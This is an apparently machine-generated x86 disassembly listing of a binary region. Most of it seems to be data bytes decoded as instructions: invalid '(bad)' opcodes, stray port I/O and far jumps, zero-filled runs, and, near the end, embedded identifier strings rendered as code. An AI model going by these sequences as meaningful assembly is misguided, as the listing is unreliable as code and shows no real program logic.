  422fe8:	lock shl DWORD PTR [edx],1
  422feb:	mov    ds:0x73723c27,al
  422ff0:	pop    eax
  422ff1:	fnop   
  422ff3:	repz mov ebx,0xe26c
  422ff9:	add    BYTE PTR [eax],al
  422ffb:	add    BYTE PTR [eax],al
  422ffd:	add    BYTE PTR [esi],dl
  422fff:	aad    0xdf
  423001:	out    dx,eax
  423002:	fucomip st,st(7)
  423004:	ss std 
  423006:	cmp    BYTE PTR [esi-0x701ca0c6],al
  42300c:	scas   eax,DWORD PTR es:[edi]
  42300d:	mov    al,0xab
  42300f:	fld    QWORD PTR [ecx]
  423011:	add    BYTE PTR [ecx+0x0],ah
  423014:	add    BYTE PTR [eax],al
  423016:	sbb    bh,ah
  423018:	jns    0x423080
  42301a:	cli    
  42301b:	push   esi
  42301c:	adc    cl,BYTE PTR [esi+0x2588a37d]
  423022:	shl    BYTE PTR [ebx-0x4e87b96c],cl
  423028:	scas   eax,DWORD PTR es:[edi]
  423029:	and    eax,0xedf73839
  42302e:	cmp    DWORD PTR [edx+0x5],0x5f
  423032:	in     eax,0xc2
  423034:	iret   
  423035:	xor    BYTE PTR [ebx],ch
  423037:	push   edx
  423038:	out    dx,al
  423039:	jmp    0x42302f
  42303b:	cli    
  42303c:	outs   dx,BYTE PTR ds:[esi]
  42303d:	inc    ebp
  42303e:	cmp    al,0xb1
  423040:	jno    0x422fe7
  423042:	addr16 dec ebx
  423044:	shl    BYTE PTR [ecx],0x24
  423047:	(bad)  
  423048:	or     al,0xd2
  42304a:	or     esi,DWORD PTR [ecx-0x5ab7802a]
  423050:	inc    ebx
  423051:	push   esi
  423052:	aas    
  423053:	adc    DWORD PTR [eax+0x3a79f46c],ebp
  423059:	adc    BYTE PTR [eax-0x671fc702],dh
  42305f:	sbb    DWORD PTR [edi+ebp*1],edx
  423062:	dec    eax
  423063:	mov    dl,ch
  423065:	adc    al,0x58
  423067:	jp     0x423000
  423069:	into   
  42306a:	dec    esp
  42306b:	pop    edi
  42306c:	ins    BYTE PTR es:[edi],dx
  42306d:	ret    
  42306e:	in     eax,dx
  42306f:	xor    DWORD PTR [edx-0x7e],0xffffffff
  423073:	or     dl,bl
  423075:	pop    fs
  423077:	add    BYTE PTR [eax],al
  423079:	add    BYTE PTR [eax],al
  42307b:	add    BYTE PTR [eax],al
  42307d:	add    BYTE PTR [esi+0x76],ch
  423080:	in     al,0xca
  423082:	cld    
  423083:	fisubr DWORD PTR [esi-0xa]
  423086:	sbb    BYTE PTR [edx-0x717f6879],dl
  42308c:	push   ebp
  42308d:	and    ecx,DWORD PTR [esi+ebx*8]
  423090:	add    DWORD PTR [eax],eax
  423092:	popa   
  423093:	add    BYTE PTR [eax],al
  423095:	add    BYTE PTR [eax+0x74ba7145],ch
  42309b:	paddusw mm5,QWORD PTR [ebx+eiz*8]
  42309f:	scas   eax,DWORD PTR es:[edi]
  4230a0:	test   eax,0xef26c3a1
  4230a5:	pop    edi
  4230a6:	stos   BYTE PTR es:[edi],al
  4230a7:	ins    DWORD PTR es:[edi],dx
  4230a8:	pop    esi
  4230a9:	xchg   esi,eax
  4230aa:	ror    BYTE PTR [eax],cl
  4230ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230ad:	bound  esi,QWORD PTR [ebx]
  4230af:	push   ecx
  4230b0:	enter  0xcf7c,0xd0
  4230b4:	push   cs
  4230b5:	repz adc ecx,DWORD PTR [edx+0x28]
  4230b9:	add    eax,0xad11959e
  4230be:	shl    BYTE PTR [ebx-0xb7509db],cl
  4230c4:	outs   dx,BYTE PTR ds:[esi]
  4230c5:	add    DWORD PTR [ebp+0x3d],eax
  4230c8:	inc    ebp
  4230c9:	xchg   ebx,eax
  4230ca:	jae    0x4230d7
  4230cc:	inc    edx
  4230cd:	cmp    BYTE PTR [esi],0x16
  4230d0:	retf   
  4230d1:	and    BYTE PTR [esi+0x64babbcf],0x1f
  4230d8:	sbb    ah,BYTE PTR [edx]
  4230da:	and    esp,esp
  4230dc:	sbb    al,0xa5
  4230de:	xlat   BYTE PTR ds:[ebx]
  4230df:	add    eax,DWORD PTR [ecx+0x246a19e7]
  4230e5:	adc    ebx,edx
  4230e7:	or     DWORD PTR [edi+0x45a2dfcd],ecx
  4230ed:	xchg   edi,eax
  4230ee:	repz push esp
  4230f0:	data16 fisub DWORD PTR [esi]
  4230f3:	xchg   ebx,eax
  4230f4:	cwde   
  4230f5:	aam    0xe1
  4230f7:	add    BYTE PTR [eax],al
  4230f9:	add    BYTE PTR [eax],al
  4230fb:	add    BYTE PTR [eax],al
  4230fd:	add    BYTE PTR [edx],bh
  4230ff:	push   edx
  423100:	les    ecx,FWORD PTR [edi]
  423102:	in     al,dx
  423103:	lahf   
  423104:	sti    
  423105:	ja     0x4230fd
  423107:	rcl    DWORD PTR [eax-0x24c3952d],1
  42310d:	mov    bh,0x6d
  42310f:	fiadd  WORD PTR [ecx]
  423111:	add    BYTE PTR [ecx+0x0],ah
  423114:	add    BYTE PTR [eax],al
  423116:	xchg   DWORD PTR [ebp+0x6d],ecx
  423119:	jl     0x4230b0
  42311b:	xor    DWORD PTR [esi],esi
  42311d:	fwait
  42311e:	test   al,0xdc
  423120:	and    BYTE PTR [ebx],dl
  423122:	or     al,BYTE PTR [edi+0x76]
  423125:	sbb    DWORD PTR [esi+0x5],ebp
  423128:	fisttp DWORD PTR [edi+ebx*4-0x58]
  42312c:	test   dh,al
  42312e:	dec    edi
  42312f:	push   ds
  423130:	ins    DWORD PTR es:[edi],dx
  423131:	push   edx
  423132:	arpl   dx,dx
  423134:	(bad)  [edi+0x1ab7ba8a]
  42313a:	inc    edi
  42313b:	shr    DWORD PTR [ecx-0x11],0x95
  42313f:	push   edi
  423140:	into   
  423141:	mov    al,ds:0x58211e84
  423146:	pushf  
  423147:	and    DWORD PTR [eax+0x1d],0x572ca6ca
  42314e:	repz adc al,0xea
  423151:	enter  0x9a8a,0x8e
  423155:	sub    ecx,DWORD PTR fs:[ebp+edx*2-0x5e]
  42315a:	jo     0x423174
  42315c:	test   eax,0x9cfa3e58
  423161:	inc    ebp
  423162:	sub    al,0xe6
  423164:	outs   dx,BYTE PTR ds:[esi]
  423165:	test   BYTE PTR [edi+0x7e70c341],dh
  42316b:	mov    dh,BYTE PTR [eax]
  42316d:	cmc    
  42316e:	adc    edx,DWORD PTR [esi+0x739e4458]
  423174:	adc    al,0x5
  423176:	rol    BYTE PTR [eax],0x0
  423179:	add    BYTE PTR [eax],al
  42317b:	add    BYTE PTR [eax],al
  42317d:	add    BYTE PTR [ebx-0x4293427d],dl
  423183:	jle    0x423158
  423185:	call   DWORD PTR [eax-0x20]
  423188:	cli    
  423189:	call   0xdece:0xc13cc258
  423190:	add    DWORD PTR [eax],eax
  423192:	popa   
  423193:	add    BYTE PTR [eax],al
  423195:	add    ch,dl
  423197:	dec    ebp
  423198:	leave  
  423199:	and    esp,DWORD PTR ds:0x80f76c6f
  42319f:	aas    
  4231a0:	or     BYTE PTR [esi-0x25],bl
  4231a3:	sub    eax,DWORD PTR [esi]
  4231a5:	adc    DWORD PTR [ebx],ebx
  4231a7:	stos   BYTE PTR es:[edi],al
  4231a8:	aas    
  4231a9:	inc    edx
  4231aa:	jo     0x42313b
  4231ac:	nop
  4231ad:	xchg   ecx,eax
  4231ae:	adc    bl,BYTE PTR [ebp+0x1c3b0514]
  4231b4:	repnz pop ecx
  4231b6:	xchg   DWORD PTR [ecx-0x34a6dbd6],esp
  4231bc:	popf   
  4231bd:	sub    eax,DWORD PTR [edi-0x22]
  4231c0:	inc    edi
  4231c1:	mov    ebx,0xed1222cc
  4231c6:	mov    bh,0x98
  4231c8:	jmp    0x83b54095
  4231cd:	mov    ebp,0x1f0fe9de
  4231d2:	jb     0x4231c9
  4231d4:	fild   WORD PTR [ebx-0x416c9c2c]
  4231da:	retf   0x9bfc
  4231dd:	add    DWORD PTR [edx+0x17],ebp
  4231e0:	enter  0x62aa,0x84
  4231e4:	jecxz  0x4231fb
  4231e6:	cdq    
  4231e7:	mov    esp,0xf8a10a84
  4231ec:	push   0xd49d7579
  4231f1:	sub    eax,0x9987d2ed
  4231f7:	add    BYTE PTR [eax],al
  4231f9:	add    BYTE PTR [eax],al
  4231fb:	add    BYTE PTR [eax],al
  4231fd:	add    ah,bl
  4231ff:	fincstp 
  423201:	shl    bh,0xee
  423204:	(bad)  
  423205:	frstor [ecx+eax*1]
  423208:	pop    ebp
  423209:	dec    edi
  42320a:	sti    
  42320b:	inc    edi
  42320c:	and    ah,0x2f
  42320f:	fild   WORD PTR [ecx]
  423211:	add    BYTE PTR [ecx+0x0],ah
  423214:	add    BYTE PTR [eax],al
  423216:	xchg   ebp,eax
  423217:	sub    al,0xe
  423219:	adc    DWORD PTR [ebp-0x3cd454b1],ecx
  42321f:	push   edi
  423220:	push   edi
  423221:	fcom   DWORD PTR [edi]
  423223:	outs   dx,BYTE PTR ds:[esi]
  423224:	xor    BYTE PTR [edx-0x80],bl
  423227:	mov    esp,0xde2c9094
  42322c:	je     0x423236
  42322e:	pop    ebx
  42322f:	push   edi
  423230:	pop    edx
  423231:	dec    ebp
  423232:	sub    BYTE PTR [ecx+0x4],bh
  423235:	sbb    DWORD PTR [ebx-0x2baeaa4c],eax
  42323b:	jne    0x423256
  42323d:	pop    ss
  42323e:	loopne 0x4231e5
  423240:	(bad)  
  423241:	repz cmp bh,BYTE PTR [ebx]
  423244:	mov    ch,0xb5
  423246:	shr    DWORD PTR [ebx],cl
  423248:	js     0x4231de
  42324a:	add    DWORD PTR [ebp-0x3a5268dd],ecx
  423250:	lds    ebp,FWORD PTR [ebp-0x10]
  423253:	push   ebx
  423254:	adc    al,0x64
  423256:	jmp    0x42320a
  423258:	pop    edx
  423259:	stos   DWORD PTR es:[edi],eax
  42325a:	test   al,0x50
  42325c:	xchg   esp,eax
  42325d:	cmp    dh,BYTE PTR [ebx]
  42325f:	xor    BYTE PTR [esi+0x3c],0x26
  423263:	cli    
  423264:	bound  ebp,QWORD PTR ds:0xf1f48bb
  42326a:	jb     0x423217
  42326c:	xor    BYTE PTR [ebp+0xb702eee],bl
  423272:	push   ebp
  423273:	cmp    ebx,eax
  423275:	(bad)  
  423276:	inc    DWORD PTR [eax]
  423278:	add    BYTE PTR [eax],al
  42327a:	add    BYTE PTR [eax],al
  42327c:	add    BYTE PTR [eax],al
  42327e:	outs   dx,DWORD PTR ds:[esi]
  42327f:	mov    ds:0x7edd2ad4,al
  423284:	jmp    edi
  423286:	push   edx
  423287:	fcmovu st,st(5)
  423289:	in     eax,0x9e
  42328b:	cmp    al,0xca
  42328d:	or     BYTE PTR [eax+0x610001df],dl
  423293:	add    BYTE PTR [eax],al
  423295:	add    BYTE PTR [ecx-0x42],ch
  423298:	and    al,0xcf
  42329a:	rcl    BYTE PTR [ebp+0x2e5952b3],1
  4232a0:	and    eax,0xa1755c0e
  4232a5:	(bad)  
  4232a6:	(bad)  
  4232a7:	pop    ds
  4232a8:	fdivr  st(5),st
  4232aa:	imul   edi,DWORD PTR [eax+0x14],0xcd394a08
  4232b1:	adc    al,ah
  4232b3:	mov    eax,ds:0x8efeaa27
  4232b8:	xchg   ebp,eax
  4232b9:	xor    ah,dl
  4232bb:	xor    dl,BYTE PTR [edx]
  4232bd:	push   ecx
  4232be:	stc    
  4232bf:	or     DWORD PTR [edx-0x68],edi
  4232c2:	sahf   
  4232c3:	popfw  
  4232c5:	rcr    BYTE PTR [edx+0x1fe718e7],cl
  4232cb:	ins    DWORD PTR es:[edi],dx
  4232cc:	xchg   edi,eax
  4232cd:	jg     0x4232c4
  4232cf:	retf   0xaebc
  4232d2:	out    0xca,al
  4232d4:	sti    
  4232d5:	mov    ds:0x45c69b7a,eax
  4232da:	(bad)  
  4232db:	push   0xde388359
  4232e0:	jmp    0x8009:0xf8545649
  4232e7:	cmp    al,0xab
  4232e9:	add    DWORD PTR [ebp-0x4e2fd750],eax
  4232ef:	das    
  4232f0:	idiv   BYTE PTR [ebx]
  4232f2:	adc    ebx,esi
  4232f4:	push   eax
  4232f5:	pop    es
  4232f6:	inc    eax
  4232f7:	add    BYTE PTR [eax],al
  4232f9:	add    BYTE PTR [eax],al
  4232fb:	add    BYTE PTR [eax],al
  4232fd:	add    cl,bh
  4232ff:	sbb    al,al
  423301:	inc    esi
  423302:	jecxz  0x4232e2
  423304:	(bad)  
  423305:	mov    edi,0xe1f1bc83
  42330a:	mov    ch,0x13
  42330c:	or     dh,BYTE PTR [edi+0x1dff1]
  423312:	popa   
  423313:	add    BYTE PTR [eax],al
  423315:	add    dl,dl
  423317:	and    eax,0xb8c7bb79
  42331c:	int3   
  42331d:	(bad)  
  42331f:	cwde   
  423320:	loope  0x423349
  423322:	arpl   dx,di
  423324:	lods   eax,DWORD PTR ss:[esi]
  423326:	mov    DWORD PTR [esi+0x9],0x93923e9a
  42332d:	mov    ebx,0x8cb6898e
  423332:	mov    eax,ds:0x54da27a3
  423337:	mov    ebp,0xe3ef2f2a
  42333c:	aad    0xe9
  42333e:	js     0x4233b5
  423340:	pop    es
  423341:	mov    ecx,0xe959cf76
  423346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423347:	std    
  423348:	sar    BYTE PTR [edx+0x1211f4db],1
  42334e:	js     0x4233c2
  423350:	or     esp,DWORD PTR [esi+0x1f8bac1c]
  423356:	add    al,al
  423358:	pop    edi
  423359:	dec    esp
  42335a:	retf   0x81ed
  42335d:	rcr    BYTE PTR [ecx-0x221bbe7a],cl
  423363:	dec    esi
  423364:	loope  0x423342
  423366:	sti    
  423367:	icebp  
  423368:	lahf   
  423369:	sbb    DWORD PTR [ebp-0x39],ecx
  42336c:	sbb    DWORD PTR [edi+0x164a0e95],0x5b281ab0
  423376:	(bad)  
  423377:	add    BYTE PTR [eax],al
  423379:	add    BYTE PTR [eax],al
  42337b:	add    BYTE PTR [eax],al
  42337d:	add    BYTE PTR [ecx+0x3e8336b9],ah
  423383:	(bad)  
  423384:	mov    ch,0xbb
  423386:	icebp  
  423387:	and    eax,0x30db8c27
  42338c:	enter  0x523d,0xe0
  423390:	add    DWORD PTR [eax],eax
  423392:	popa   
  423393:	add    BYTE PTR [eax],al
  423395:	add    BYTE PTR [edi+0x7d09fc0a],ah
  42339b:	xchg   edx,eax
  42339c:	adc    esi,DWORD PTR ss:[esi-0x5082ee68]
  4233a3:	push   cs
  4233a4:	or     al,0xd5
  4233a6:	arpl   WORD PTR [edi],ax
  4233a8:	push   ebp
  4233a9:	scas   al,BYTE PTR es:[edi]
  4233aa:	in     al,0xd0
  4233ac:	aam    0xdd
  4233ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233af:	fsubp  st(0),st
  4233b1:	sbb    al,0xeb
  4233b3:	mov    dl,0x2c
  4233b5:	stos   DWORD PTR es:[edi],eax
  4233b6:	dec    ebp
  4233b7:	les    eax,FWORD PTR [esi-0x6796f435]
  4233bd:	clc    
  4233be:	ror    DWORD PTR [eax],1
  4233c0:	push   0xffffffa3
  4233c2:	pop    esp
  4233c3:	clc    
  4233c4:	adc    al,0x96
  4233c6:	sub    eax,DWORD PTR [ebx+0x15]
  4233c9:	fcmovu st,st(0)
  4233cb:	or     eax,0x689d3921
  4233d0:	push   0x67
  4233d2:	xchg   ebp,eax
  4233d3:	test   DWORD PTR [edi-0x79],edx
  4233d6:	pop    edx
  4233d7:	mov    ds:0xba023dc,eax
  4233dc:	pop    edi
  4233dd:	mov    dl,0xd3
  4233df:	addr16 dec eax
  4233e1:	pop    ebx
  4233e2:	fld    QWORD PTR ds:0x20c161b
  4233e8:	sbb    eax,DWORD PTR [esi-0x75bca0b4]
  4233ee:	nop
  4233ef:	sbb    al,0x1
  4233f1:	shl    eax,0x19
  4233f4:	das    
  4233f5:	test   DWORD PTR [edx+0x0],ebp
  4233fb:	add    BYTE PTR [eax],al
  4233fd:	add    BYTE PTR [edx],dl
  4233ff:	xlat   BYTE PTR ds:[ebx]
  423400:	repz or esi,edi
  423403:	das    
  423404:	cli    
  423405:	fist   WORD PTR [ecx]
  423407:	dec    ebx
  423408:	es nop
  42340a:	mov    ah,al
  42340c:	or     DWORD PTR [ebx+esi*4-0x20],0x1
  423411:	add    BYTE PTR [ecx+0x0],ah
  423414:	add    BYTE PTR [eax],al
  423416:	ret    0x2281
  423419:	mov    dh,0xfe
  42341b:	out    0x4f,eax
  42341d:	test   BYTE PTR ds:0x30c2cf1d,dl
  423423:	pop    ebp
  423424:	repz inc ebx
  423426:	sub    BYTE PTR [ebp+0x79],bh
  423429:	cmp    eax,0x2e8b3868
  42342e:	ret    0x404c
  423431:	das    
  423432:	inc    ebp
  423433:	loope  0x423416
  423435:	lds    ebx,FWORD PTR [esi+0x5]
  423438:	mov    edi,0x92236c3a
  42343d:	jnp    0x4233fb
  42343f:	sbb    DWORD PTR [edx],edi
  423441:	popa   
  423442:	js     0x4233d5
  423444:	cmp    dh,BYTE PTR [eax+0x68]
  423447:	popf   
  423448:	xchg   edi,eax
  423449:	xchg   BYTE PTR [ebx-0x49a4f0ff],dh
  42344f:	nop
  423450:	pop    eax
  423451:	cli    
  423452:	and    BYTE PTR [edi-0x58],ah
  423455:	(bad)  
  423456:	jmp    0x423441
  423458:	lods   eax,DWORD PTR ds:[esi]
  423459:	mov    BYTE PTR [eax],0x58
  42345c:	mov    ch,0xef
  42345e:	pop    eax
  42345f:	push   0x10ce5cec
  423464:	jo     0x423438
  423466:	mov    esp,0x678d62e3
  42346b:	push   ss
  42346c:	inc    ebx
  42346d:	sub    bl,BYTE PTR [esp+esi*2-0x6d]
  423471:	outs   dx,DWORD PTR ds:[esi]
  423472:	into   
  423473:	jge    0x423466
  423475:	mov    eax,edx
  423477:	add    BYTE PTR [eax],al
  423479:	add    BYTE PTR [eax],al
  42347b:	add    BYTE PTR [eax],al
  42347d:	add    BYTE PTR [edx],dl
  42347f:	mov    edx,0xe6f8c6d8
  423484:	push   ds
  423485:	(bad)  
  423486:	adc    bl,dh
  423488:	cwde   
  423489:	out    dx,al
  42348a:	dec    ebp
  42348b:	pop    ebx
  42348c:	xor    cl,BYTE PTR ds:0x1e114
  423492:	popa   
  423493:	add    BYTE PTR [eax],al
  423495:	add    BYTE PTR [eax],ah
  423497:	fst    DWORD PTR [ebx+0x5cfd9bf1]
  42349d:	sub    eax,0x943055c9
  4234a2:	ds and eax,0x541ec1f2
  4234a8:	cwde   
  4234a9:	bound  ebp,QWORD PTR [eax+0x50]
  4234ac:	inc    ebp
  4234ad:	aad    0x5d
  4234af:	sub    al,0x4e
  4234b1:	retf   0x8c52
  4234b4:	je     0x423500
  4234b6:	pop    es
  4234b7:	dec    ecx
  4234b8:	les    edx,FWORD PTR [eax]
  4234ba:	pop    esi
  4234bb:	xchg   ebp,eax
  4234bc:	xchg   BYTE PTR [ebx-0x67efa965],ah
  4234c2:	bound  edi,QWORD PTR [edx+0x30]
  4234c5:	popf   
  4234c6:	xor    ecx,DWORD PTR [edi-0x4c]
  4234c9:	add    ch,BYTE PTR [esi+edi*4-0x5d]
  4234cd:	imul   ebx,DWORD PTR [ecx+0x4a],0x1059f65d
  4234d4:	loop   0x423501
  4234d6:	mov    bh,BYTE PTR [esi-0x7a]
  4234d9:	daa    
  4234da:	and    dh,BYTE PTR [edi-0x3e]
  4234dd:	dec    esp
  4234de:	(bad)  
  4234df:	cmp    cl,BYTE PTR [esi]
  4234e1:	stos   DWORD PTR es:[edi],eax
  4234e2:	(bad)  
  4234e3:	cmp    eax,0x7a0ac83a
  4234e8:	ret    
  4234e9:	scas   eax,DWORD PTR es:[edi]
  4234ea:	ins    BYTE PTR es:[edi],dx
  4234eb:	cdq    
  4234ec:	add    dl,bh
  4234ee:	shl    BYTE PTR [ebp-0x5042218e],1
  4234f4:	mov    cl,0x91
  4234f6:	push   ss
	...
  4234ff:	rol    BYTE PTR [edx+0x0],0x4
  423503:	rol    BYTE PTR [edx+0x0],0x8
  423507:	rol    BYTE PTR [edx+0x0],0xc
  42350b:	rol    BYTE PTR [edx+0x0],0x10
  42350f:	rol    BYTE PTR [edx+0x0],0x14
  423513:	rol    BYTE PTR [edx+0x0],0x18
  423517:	rol    BYTE PTR [edx+0x0],0x1c
  42351b:	rol    BYTE PTR [edx+0x0],0x57
  42351f:	inc    edi
  423520:	cmp    DWORD PTR [edi+0x41],ebx
  423523:	pop    eax
  423524:	ss push esi
  423526:	pop    edi
  423527:	cmp    BYTE PTR [eax],al
  423529:	inc    ebx
  42352a:	inc    ebp
  42352b:	dec    esp
  42352c:	pop    edi
  42352d:	pop    eax
  42352e:	push   edi
  42352f:	dec    eax
  423530:	inc    edx
  423531:	add    BYTE PTR [edi+0x50],dl
  423534:	xor    eax,0x4641365f
  423539:	cmp    DWORD PTR [edx],esi
  42353b:	xor    ebx,DWORD PTR [edi+0x32]
  42353e:	aaa    
  42353f:	add    BYTE PTR [eax+0x48],dl
  423542:	xor    BYTE PTR [edi+0x58],bl
  423545:	push   esp
  423546:	inc    ecx
  423547:	dec    ebp
  423548:	push   ecx
  423549:	pop    edi
  42354a:	inc    esi
  42354b:	push   ebp
  42354c:	cmp    DWORD PTR [eax],eax
  42354e:	push   edi
  42354f:	push   ebp
  423550:	inc    ecx
  423551:	xor    dh,BYTE PTR [ebx]
  423553:	xor    ebx,DWORD PTR [edi+0x4e]
  423556:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42355a:	cmp    DWORD PTR [edi+0x38],ebx
  42355d:	dec    ecx
  42355e:	cmp    DWORD PTR [edx+0x36],ebx
  423561:	pop    edi
  423562:	dec    edx
  423563:	xor    BYTE PTR [edx+0x34],cl
  423566:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42356a:	xor    esi,DWORD PTR [eax]
  42356c:	pop    edi
  42356d:	inc    edx
  42356e:	dec    ebx
  42356f:	pop    eax
  423570:	pop    eax
  423571:	xor    eax,0x51414d00
  423576:	pop    edi
  423577:	inc    ecx
  423578:	xor    al,BYTE PTR [ebp+0x5f]
  42357b:	inc    ecx
  42357c:	dec    ebx
  42357d:	cmp    DWORD PTR ds:0x5a003939,esi
  423583:	inc    ebp
  423584:	cmp    BYTE PTR [edi+0x4d],bl
  423587:	ss dec eax
  423589:	dec    ebx
  42358a:	add    BYTE PTR [ebp+0x57],al
  42358d:	xor    DWORD PTR [edi+0x31],ebx
  423590:	dec    ebx
  423591:	xor    eax,DWORD PTR [ecx+0x30]
  423594:	push   ebx
  423595:	add    BYTE PTR [edx+esi*1+0x36],al
  423599:	aaa    
  42359a:	pop    edi
  42359b:	push   edx
  42359c:	dec    eax
  42359d:	dec    ebp
  42359e:	cmp    BYTE PTR [edi+0x37],bl
  4235a1:	inc    esi
  4235a2:	xor    eax,0x43355500
  4235a7:	pop    edi
  4235a8:	pop    ecx
  4235a9:	dec    ecx
  4235aa:	push   ebx
  4235ab:	xor    bl,BYTE PTR [edi+0x52]
  4235ae:	add    BYTE PTR [eax+0x55],dl
  4235b1:	dec    ecx
  4235b2:	xor    BYTE PTR [edi+0x43],bl
  4235b5:	ss inc ebp
  4235b7:	xor    bl,BYTE PTR [edi+0x4d]
  4235ba:	xor    al,0x4a
  4235bc:	push   edx
  4235bd:	push   ebp
  4235be:	add    BYTE PTR [esi+0x39],cl
  4235c1:	push   eax
  4235c2:	pop    edi
  4235c3:	push   ebp
  4235c4:	cmp    DWORD PTR [esi],esi
  4235c6:	xor    BYTE PTR [ecx],dh
  4235c8:	pop    edi
  4235c9:	dec    edi
  4235ca:	dec    esi
  4235cb:	push   esp
  4235cc:	cmp    BYTE PTR [eax],al
  4235ce:	dec    esp
  4235cf:	xor    al,0x44
  4235d1:	xor    DWORD PTR [edi+0x4b],ebx
  4235d4:	xor    DWORD PTR [ebp+0x5f],eax
  4235d7:	pop    edx
  4235d8:	add    BYTE PTR [edi+esi*1+0x43],dl
  4235dc:	pop    edi
  4235dd:	inc    edx
  4235de:	xor    dh,BYTE PTR [ecx]
  4235e0:	push   ebx
  4235e1:	xor    DWORD PTR [ecx],edi
  4235e3:	inc    edx
  4235e4:	add    BYTE PTR [edi+0x45],al
  4235e7:	xor    al,0x38
  4235e9:	xor    BYTE PTR [eax],dh
  4235eb:	pop    edi
  4235ec:	dec    edx
  4235ed:	dec    ebx
  4235ee:	xor    eax,0x33345f4d
  4235f3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235f7:	pop    edi
  4235f8:	aaa    
  4235f9:	push   esi
  4235fa:	dec    ebx
  4235fb:	push   edx
  4235fc:	pop    edi
  4235fd:	inc    ebx
  4235fe:	add    BYTE PTR [edx+0x35],bl
  423601:	dec    ebp
  423602:	pop    edi
  423603:	inc    edi
  423604:	dec    esi
  423605:	xor    al,0x49
  423607:	xor    eax,0x54590035
  42360c:	push   edx
  42360d:	pop    edi
  42360e:	push   esp
  42360f:	inc    ebx
  423610:	inc    ecx
  423611:	pop    edi
  423612:	cmp    DWORD PTR [ecx+0x41],ebx
  423615:	push   ebp
  423616:	pop    edi
  423617:	push   ebp
  423618:	inc    ebp
  423619:	add    BYTE PTR [esi+esi*1+0x35],cl
  42361d:	pop    edi
  42361e:	pop    eax
  42361f:	dec    edx
  423620:	inc    edx
  423621:	inc    edi
  423622:	add    BYTE PTR [edx+0x36],al
  423625:	inc    ebx
  423626:	pop    edi
  423627:	xor    BYTE PTR ds:0x36464b,dh
  42362d:	dec    ebx
  42362e:	cmp    DWORD PTR [esi+0x37],eax
  423631:	xor    ebx,DWORD PTR [edi+0x35]
  423634:	ss inc edi
  423636:	pop    ecx
  423637:	dec    eax
  423638:	pop    ecx
  423639:	add    BYTE PTR [ebp+0x35],cl
  42363c:	push   eax
  42363d:	xor    BYTE PTR [edi+0x4f],bl
  423640:	pop    ecx
  423641:	xor    cl,BYTE PTR [edi+0x0]
  423644:	pop    ecx
  423645:	xor    DWORD PTR [esi+0x5f],ecx
  423648:	xor    al,BYTE PTR [edx+0x30]
  42364b:	push   esi
  42364c:	push   esp
  42364d:	inc    ebp
  42364e:	add    BYTE PTR [edi+0x37],al
  423651:	push   esi
  423652:	xor    DWORD PTR [edi+0x49],ebx
  423655:	xor    al,BYTE PTR [esi+0x30]
  423658:	pop    edi
  423659:	ss dec esi
  42365b:	cmp    BYTE PTR [eax],al
  42365d:	pop    edx
  42365e:	xor    eax,0x445f334b
  423663:	xor    BYTE PTR [eax],bh
  423665:	push   ecx
  423666:	push   esi
  423667:	xor    al,0x0
  423669:	push   ebp
  42366a:	pop    eax
  42366b:	inc    edi
  42366c:	xor    DWORD PTR [edi+0x39],ebx
  42366f:	push   esp
  423670:	inc    ebx
  423671:	aaa    
  423672:	inc    esp
  423673:	add    BYTE PTR [edi+0x39],dl
  423676:	ss pop edi
  423678:	dec    eax
  423679:	pop    edx
  42367a:	pop    ecx
  42367b:	inc    edi
  42367c:	push   ebp
  42367d:	pop    edi
  42367e:	push   eax
  42367f:	dec    eax
  423680:	inc    ebx
  423681:	add    BYTE PTR [ebp+0x0],dl
  423684:	xor    al,0x0
  423686:	dec    edi
  423687:	add    BYTE PTR [edi+0x0],bl
  42368a:	cmp    BYTE PTR [eax],al
  42368c:	xor    al,BYTE PTR [eax]
  42368e:	inc    ebx
  42368f:	add    BYTE PTR [edx+0x0],bl
  423692:	inc    ebx
  423693:	add    BYTE PTR [edi],dh
  423695:	add    BYTE PTR [edi+0x0],bl
  423698:	inc    ebx
  423699:	add    BYTE PTR [eax+eax*1+0x0],al
  42369d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4236a1:	add    BYTE PTR [edx],dh
  4236a3:	add    BYTE PTR [edi+0x0],bl
  4236a6:	cmp    BYTE PTR [eax],al
  4236a8:	dec    esp
  4236a9:	add    BYTE PTR [esi+0x0],dl
  4236ac:	pop    edi
  4236ad:	add    BYTE PTR [ecx+0x0],bl
  4236b0:	push   edx
  4236b1:	add    BYTE PTR [esi+0x0],dl
  4236b4:	xor    al,BYTE PTR [eax]
  4236b6:	cmp    BYTE PTR [eax],al
  4236b8:	pop    edi
  4236b9:	add    BYTE PTR [edx+0x0],cl
  4236bc:	add    BYTE PTR [eax],al
  4236be:	inc    edx
  4236bf:	add    BYTE PTR [eax+eax*1+0x46],cl
  4236c3:	add    BYTE PTR [edi+0x0],bl
  4236c6:	xor    eax,DWORD PTR [eax]
  4236c8:	inc    ebp
  4236c9:	add    BYTE PTR [ecx+0x0],cl
  4236cc:	push   edx
  4236cd:	add    BYTE PTR [ecx],bh
  4236cf:	add    BYTE PTR [esi+0x0],dl
  4236d2:	add    BYTE PTR [eax],al
  4236d4:	dec    ebp
  4236d5:	add    BYTE PTR [edi],dh
  4236d7:	add    BYTE PTR [eax+eax*1+0x5f],al
  4236db:	add    BYTE PTR [edx+0x0],cl
  4236de:	pop    eax
  4236df:	add    BYTE PTR [ebx],dh
  4236e1:	add    BYTE PTR [ecx],dh
  4236e3:	add    BYTE PTR [ebx+0x0],al
  4236e6:	add    BYTE PTR [eax],al
  4236e8:	dec    edi
  4236e9:	add    BYTE PTR [esi],dh
  4236eb:	add    BYTE PTR [eax+0x0],cl
  4236ee:	pop    edi
  4236ef:	add    BYTE PTR [eax],dh
  4236f1:	add    BYTE PTR [edi],dh
  4236f3:	add    BYTE PTR [ecx],dh
  4236f5:	add    BYTE PTR [edx+0x0],dl
  4236f8:	xor    eax,0x55000000
  4236fd:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423701:	add    BYTE PTR [edi+0x0],bl
  423704:	push   esp
  423705:	add    BYTE PTR [ecx+0x0],al
  423708:	cmp    DWORD PTR [eax],eax
  42370a:	pop    edi
  42370b:	add    BYTE PTR [ebx],dh
  42370d:	add    BYTE PTR [eax],dh
